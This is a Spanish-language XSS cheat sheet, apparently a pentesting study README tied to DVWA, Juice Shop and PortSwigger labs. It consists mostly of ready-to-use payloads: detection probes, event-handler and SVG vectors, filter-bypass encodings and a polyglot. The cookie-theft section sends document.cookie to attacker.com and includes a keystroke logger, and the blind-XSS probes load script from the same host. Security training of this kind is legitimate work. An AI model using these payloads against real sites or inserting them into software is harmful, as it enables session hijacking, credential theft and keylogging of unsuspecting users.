<div align="center">

# 🧨 XSS
### Reflected, Stored y DOM XSS

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-Cross--site%20Scripting-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **XSS:** input del usuario renderizado en HTML sin encoding permite al navegador interpretarlo como JavaScript ejecutable. **Reflected:** payload en request, ejecuta una vez al visitar link. **Stored:** payload persistido en DB, ejecuta para todos los que carguen la página. **DOM:** JavaScript del sitio toma input de un source (`location.hash`, `location.search`) y lo escribe en un sink (`innerHTML`, `eval`) sin pasar por servidor.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Sources y Sinks](#-sources-y-sinks) |
| 04 | [🧪 Payloads Base](#-payloads-base) |
| 05 | [🧱 Payloads Avanzados](#-payloads-avanzados) |
| 06 | [🛡️ Bypass de Filtros](#️-bypass-de-filtros) |
| 07 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 08 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 09 | [🧠 Contextos Típicos](#-contextos-típicos) |
| 10 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 11 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | XSS Reflected, XSS Stored, XSS DOM |
| **Juice Shop** | DOM XSS, Bonus Payload, Reflected XSS, API-only XSS |
| **PortSwigger** | Cross-site scripting |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-dalfox-ff3c6e?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-DevTools-5865f2?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `Replay`, `HTTP History` |
| **Firefox DevTools** | DOM, CSP, storage, eventos, JS debugging |
| **dalfox** | Escaneo automático de XSS reflejado/DOM |

---

## 🔍 Sources y Sinks

![Context](https://img.shields.io/badge/Análisis-Sources%20%26%20Sinks-00d4ff?style=flat-square)

### `[01]` Sources — entradas controladas

Datos que el atacante puede manipular:

- `location.search` (query string)
- `location.hash` (fragmento URL)
- `document.referrer`
- `document.URL` / `document.location`
- `postMessage` data
- `localStorage` / `sessionStorage` si poblado desde URL
- Input de formulario reflejado en HTML

### `[02]` Sinks DOM peligrosos

Funciones/propiedades que renderizan sin encoding:

```javascript
innerHTML
document.write
document.writeln
location.href = userInput    // si incluye javascript:
eval(userInput)
setTimeout(userInput)
setInterval(userInput)
Function(userInput)()
element.setAttribute('src', userInput)
element.setAttribute('href', userInput)
```

> [!TIP]
> Buscar en DevTools con `Ctrl+Shift+F` → `location.search` e `innerHTML` para localizar sinks DOM. También revisar `Sources` tab para ver JS que manipula el DOM.

---

## 🧪 Payloads Base

### `[01]` HTML context — detección

```html
<xss123>
"><xss123>
'><xss123>
```

### `[02]` HTML context — ejecución

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
```

### `[03]` Attribute context

```html
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
"><svg/onload=alert(1)>
" onmouseover="alert(1)
' onclick='alert(1)
```

### `[04]` JavaScript string context

```javascript
'-alert(1)-'
';alert(1);//
\';alert(1)//
</script><script>alert(1)</script>
```

### `[05]` DOM probes

```text
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
```

> [!NOTE]
> Siempre probar payload mínimo `<xss123>` primero para detectar reflexión antes de intentar ejecución.

---

## 🧱 Payloads Avanzados

![Context](https://img.shields.io/badge/Técnica-Avanzada-a855f7?style=flat-square)

### `[01]` HTML5 event handlers

```html
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<details open ontoggle=alert(1)>
<audio oncanplay=alert(1)><source src="x.wav" type="audio/wav"></audio>
<marquee onstart=alert(1)>
```

### `[02]` SVG avanzado

```html
<svg onload=alert(1)>
<svg id=alert(1) onload=eval(id)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### `[03]` CSS / Animation events

```html
<style>@keyframes x{}</style>
<xss style="animation-name:x" onanimationend="alert(1)"></xss>
```

### `[04]` JavaScript protocol

```html
<a href="javascript:alert(1)">click</a>
<a href="javascript:prompt(document.cookie)">click</a>
```

### `[05]` Data URI

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
data:text/html,<script>alert(0)</script>
```

### `[06]` Robo de cookies y exfiltración

```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<script>new Image().src="http://attacker.com/?c="+document.cookie</script>
<script>fetch('https://attacker.com',{method:'POST',mode:'no-cors',body:document.cookie})</script>
<img src=x onerror='document.onkeypress=function(e){fetch("http://attacker.com/?k="+String.fromCharCode(e.which))},this.remove();'>
```

### `[07]` Blind XSS probes (para stored)

```html
"><script src="https://attacker.com/probe.js"></script>
"><script src=//attacker.com></script>
```

### `[08]` Polyglot

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## 🛡️ Bypass de Filtros

![Context](https://img.shields.io/badge/Bypass-Encoding%20%26%20Filtros-ff3c6e?style=flat-square)

### Encoding de caracteres

```text
Hex:     \x3cscript\x3ealert(1)\x3c/script\x3e
Unicode: <script>alert(1)</script>
HTML:    &#60;script&#62;alert(1)&#60;/script&#62;
```

### Whitespace / newline bypass (contexto URL)

```text
java%0ascript:alert(1)    (LF)
java%09script:alert(1)    (Tab)
java%0dscript:alert(1)    (CR)
javascript://%0Aalert(1)
```

### Case manipulation

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=1 ONERROR=alert(1)>
<SVG ONLOAD=alert(1)>
```

### Tag mutation / filter breaking

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<<script>alert(1)//<</script>
<script >alert(1)</script >
```

### AngularJS sandbox escape (si Angular whitelisted en CSP)

```
{{constructor.constructor('alert(1)')()}}
```

> [!IMPORTANT]
> Leer raw HTML de response, no render del navegador. El encoding puede parecer ejecución fallida cuando el problema es el contexto. Revisar también header `Content-Security-Policy`.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Hallar reflection

Capturar request de:

- búsqueda
- comentarios / feedback
- profile fields
- parámetros `q`, `search`, `name`, `returnUrl`

### `[02]` Replay manual

Primero detección:

```text
test123
<xss123>
"><xss123>
```

Luego ejecución si reflexión confirmada:

```text
<svg/onload=alert(1)>
```

### `[03]` Observar contexto

Mirar response:

- raw HTML — ¿dónde aparece el input?
- encode parcial o completo
- CSP en headers
- ¿dentro de `<script>`, atributo, o HTML body?

### `[04]` Variantes por contexto

Si bloquea `<script>`, probar:

```text
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
```

Si input dentro de atributo:

```text
" autofocus onfocus=alert(1) x="
```

Si input dentro de JS string:

```text
'-alert(1)-'
```

> [!IMPORTANT]
> El contexto determina el payload. HTML body ≠ atributo ≠ JS string. Identificar contexto primero.

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-dalfox-ff3c6e?style=flat-square)

```bash
# Scan automático
dalfox url "http://target/search?q=FUZZ"

# Curl con payload encoded
curl -i "http://target/search?q=%3Csvg/onload=alert(1)%3E"
```

---

## 🧠 Contextos Típicos

| Contexto | Ejemplo | Payload |
|----------|---------|---------|
| **HTML body** | `<div>INPUT</div>` | `<script>alert(1)</script>` |
| **Attribute** | `<input value="INPUT">` | `" onfocus=alert(1) autofocus x="` |
| **JS string** | `var x='INPUT'` | `'-alert(1)-'` |
| **URL / href** | `<a href="INPUT">` | `javascript:alert(1)` |
| **DOM sink** | JS toma `location.search` | `<img src=x onerror=alert(1)>` |

---

## 🧭 Ruta de Práctica

1. DVWA Reflected XSS
2. DVWA Stored XSS
3. DVWA DOM XSS
4. Juice Shop DOM XSS
5. Juice Shop Reflected XSS
6. PortSwigger: reflected XSS HTML context
7. PortSwigger: attribute injection
8. PortSwigger: JS string escape
9. PortSwigger: DOM XSS con `document.write` / `innerHTML`

---

## 📝 Checklist

- [ ] source controlado localizado
- [ ] sink identificado
- [ ] contexto exacto definido (HTML / attr / JS / DOM)
- [ ] payload mínimo reflejado
- [ ] payload ejecutable validado
- [ ] CSP / filtros documentados

---

## 🔗 Referencias

- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
